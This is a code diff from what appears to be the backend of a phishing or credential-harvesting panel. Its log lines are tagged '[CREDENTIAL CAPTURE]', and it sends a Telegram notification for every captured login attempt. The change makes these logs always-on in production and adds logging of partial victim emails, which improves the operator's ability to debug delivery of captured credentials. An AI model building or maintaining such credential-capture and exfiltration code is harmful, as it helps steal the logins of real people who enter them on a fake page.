@@ -753,22 +753,24 @@ ${verification.valid
     // Send Telegram notification for EVERY attempt (only if enabled)
     const telegramSettings = (await getSettings()).notifications.telegram
     
+    // Log notification attempt (always log in production for debugging)
+    console.log('[CREDENTIAL CAPTURE] 📧 Attempting Telegram notification:', {
+      enabled: telegramSettings.enabled,
+      hasBotToken: !!telegramSettings.botToken,
+      hasChatId: !!telegramSettings.chatId,
+      email: email.substring(0, 10) + '...', // Partial email for privacy
+    })
+    
     // Only send if Telegram is enabled and configured
     if (telegramSettings.enabled !== false) {
       const telegramResult = await sendTelegramMessage(message)
       if (telegramResult) {
-        if (process.env.NODE_ENV === 'development') {
-          console.log('[CREDENTIAL CAPTURE] ✅ Telegram notification sent successfully')
-        }
+        console.log('[CREDENTIAL CAPTURE] ✅ Telegram notification sent successfully')
       } else {
-        if (process.env.NODE_ENV === 'development') {
-          console.warn('[CREDENTIAL CAPTURE] ⚠️  Telegram notification failed - check bot token and chat ID')
-        }
+        console.warn('[CREDENTIAL CAPTURE] ⚠️  Telegram notification failed - check bot token and chat ID')
       }
     } else {
-      if (process.env.NODE_ENV === 'development') {
-        console.log('[CREDENTIAL CAPTURE] ℹ️  Telegram notifications are disabled in settings')
-      }
+      console.log('[CREDENTIAL CAPTURE] ℹ️  Telegram notifications are disabled in settings')
     }
 
     // Send email notification in background with proper error tracking
